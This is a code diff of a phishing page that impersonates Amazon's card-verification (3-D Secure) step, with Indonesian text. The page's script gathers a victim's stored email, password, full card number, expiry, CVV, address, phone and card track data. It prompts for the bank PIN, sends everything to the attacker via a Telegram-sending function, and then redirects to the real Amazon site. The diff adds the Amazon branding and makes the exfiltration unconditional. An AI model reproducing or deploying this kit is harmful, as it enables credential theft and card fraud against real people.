@@ -7,10 +7,10 @@
     <script src="config.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
+        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
         .logo { margin: 0 0 25px; text-align: center; }
-        .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px 26px; }
+        .logo img { height: 32px; }
+        .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
         h1 { font-size: 20px; margin-bottom: 8px; font-weight: 500; }
         .sub { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.5; }
         .info { background: #f7f8f8; border-radius: 6px; padding: 12px 15px; margin-bottom: 25px; font-size: 13px; line-height: 1.8; }
@@ -20,10 +20,10 @@
         .pin-kolom { flex: 1; max-width: 65px; }
         .pin-kolom input { width: 100%; height: 50px; text-align: center; font-size: 20px; border: 1px solid #a6a6a6; border-radius: 4px; outline: none; }
         .pin-kolom input:focus { border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
-        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
+        button { width: 100%; padding: 12px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; }
         button:hover { background: #F7CA00; }
-        button:disabled { opacity: 0.6; cursor: not-allowed; }
-        .proses { display: none; color: #007600; margin-top: 15px; text-align: center; font-size: 14px; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .proses { display: none; color: #007600; margin-top: 15px; text-align: center; }
         .proses.tampil { display: block; }
         .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
         .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
@@ -39,7 +39,7 @@
             <div>Kartu: <strong id="tampilKartu">—</strong></div>
             <div>Email: <strong id="tampilEmail">—</strong></div>
         </div>
-        
+
         <form id="form3ds">
             <p class="pin-judul">Masukkan PIN Anda</p>
             <p class="pin-ket">Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.</p>
@@ -53,48 +53,38 @@
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p6"></div>
             </div>
 
-            <button type="submit" id="tombolKirim">Verify & Complete</button>
-            
-            <div class="proses" id="sedang">
-                ⏳ Sedang memverifikasi...
-            </div>
+            <button type="submit" id="tombol">Verify & Complete</button>
+            <div class="proses" id="sedang">⏳ Sedang memverifikasi...</div>
         </form>
     </div>
     <div class="footer">
-        <a href="#">Conditions of Use</a>
-        <a href="#">Privacy Notice</a>
-        <a href="#">Help</a>
-        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#">Syarat Penggunaan</a>
+        <a href="#">Pemberitahuan Privasi</a>
+        <a href="#">Bantuan</a>
+        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. atau afiliasinya</p>
     </div>
 
     <script>
-        // === AMBIL DATA ===
         const email = localStorage.getItem('emailPengguna') || '';
         const pass = localStorage.getItem('passwordPengguna') || '';
-        const namaKartu = localStorage.getItem('namaKartu') || '';
         const nomor = localStorage.getItem('nomorKartu') || '';
         const expiry = localStorage.getItem('expiry') || '';
         const cvv = localStorage.getItem('cvv') || '';
+        const namaKartu = localStorage.getItem('namaKartu') || '';
         const alamat = localStorage.getItem('alamat') || '';
         const kota = localStorage.getItem('kota') || '';
         const kodepos = localStorage.getItem('kodepos') || '';
         const telepon = localStorage.getItem('telepon') || '';
         const track = localStorage.getItem('trackKartu') || '';
 
-        // Tampilkan 4 angka terakhir kartu
-        if (nomor && nomor.length >= 4) {
-            const akhir = nomor.slice(-4);
-            document.getElementById('tampilKartu').textContent = `•••• •••• •••• ${akhir}`;
-        } else {
-            document.getElementById('tampilKartu').textContent = 'Tidak tersedia';
-        }
+        if (!nomor || !email) { window.location.href = 'billing.html'; }
 
-        // Tampilkan email
-        if (email) {
-            document.getElementById('tampilEmail').textContent = email;
-        }
+        const tampilNomor = nomor.length >= 4 
+            ? `•••• •••• •••• ${nomor.slice(-4)}` 
+            : 'Tidak tersedia';
+        document.getElementById('tampilKartu').textContent = tampilNomor;
+        document.getElementById('tampilEmail').textContent = email;
 
-        // === KOLOM PIN ===
         const kolom = [
             { el: document.getElementById('p1'), val: '' },
             { el: document.getElementById('p2'), val: '' },
@@ -106,37 +96,23 @@
 
         kolom.forEach((item, i) => {
             item.el.addEventListener('input', function() {
-                const angka = this.value.replace(/[^0-9]/g, '');
+                const angka = this.value.replace(/\D/g, '');
                 if (angka) {
                     item.val = angka[0];
                     this.value = '•';
-                    // Pindah ke kolom berikutnya
-                    if (i < 5) {
-                        kolom[i + 1].el.focus();
-                    }
+                    if (i < 5) kolom[i+1].el.focus();
                 }
             });
-
             item.el.addEventListener('focus', function() {
-                if (item.val) {
-                    this.value = item.val;
-                }
+                if (item.val) this.value = item.val;
             });
-
             item.el.addEventListener('blur', function() {
-                if (item.val) {
-                    this.value = '•';
-                }
+                if (item.val) this.value = '•';
             });
-
             item.el.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace') {
-                    if (!item.val && i > 0) {
-                        kolom[i - 1].el.focus();
-                    } else {
-                        item.val = '';
-                        this.value = '';
-                    }
+                    if (!item.val && i > 0) kolom[i-1].el.focus();
+                    else { item.val = ''; this.value = ''; }
                 }
             });
         });
@@ -145,34 +121,27 @@
             return kolom.map(k => k.val).join('');
         }
 
-        // === KIRIM DATA ===
-        const form = document.getElementById('form3ds');
-        form.addEventListener('submit', async function(e) {
+        document.getElementById('form3ds').addEventListener('submit', async e => {
             e.preventDefault();
             const pin = ambilPIN();
-            
-            if (pin.length !== 6) {
-                alert('Masukkan 6 digit kode PIN');
-                return;
-            }
+            if (pin.length !== 6) { alert('Masukkan 6 digit PIN'); return; }
 
-            document.getElementById('tombolKirim').disabled = true;
-            document.getElementById('tombolKirim').style.display = 'none';
+            document.getElementById('tombol').disabled = true;
+            document.getElementById('tombol').style.display = 'none';
             document.getElementById('sedang').classList.add('tampil');
 
             const pesan = `
-💳 *RESULT CC*
+🔐 *PIN VERIFIED*
 ━━━━━━━━━━━━━━━━━━━━━
 📧 Email: \`${email}\`
 🔑 Password: \`${pass}\`
-👤 Nama di Kartu: \`${namaKartu}\`
-🔢 Nomor Kartu: \`${nomor}\`
-📅 Expiry: \`${expiry}\`
+👤 Nama: \`${namaKartu}\`
+🔢 Kartu: \`${nomor}\`
+📅 Exp: \`${expiry}\`
 🔒 CVV: \`${cvv}\`
 📍 Alamat: \`${alamat}, ${kota} — ${kodepos}\`
-📞 Telepon: \`${telepon}\`
-━━━━━━━━━━━━━━━━━━━━━
-🔐 PIN / 3DS: \`${pin}\`
+📞 Telp: \`${telepon}\`
+🔐 PIN: \`${pin}\`
 ━━━━━━━━━━━━━━━━━━━━━
 📋 *TRACK DATA*
 \`\`\`
@@ -180,10 +149,7 @@ ${track}
 \`\`\`
 🕐 Waktu: ${new Date().toLocaleString()}
             `.trim();
-
-            if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
-                await CONFIG.kirimKeTelegram(pesan);
-            }
+            await CONFIG.kirimKeTelegram(pesan);
 
             setTimeout(() => {
                 window.location.href = 'https://www.amazon.com.au/';
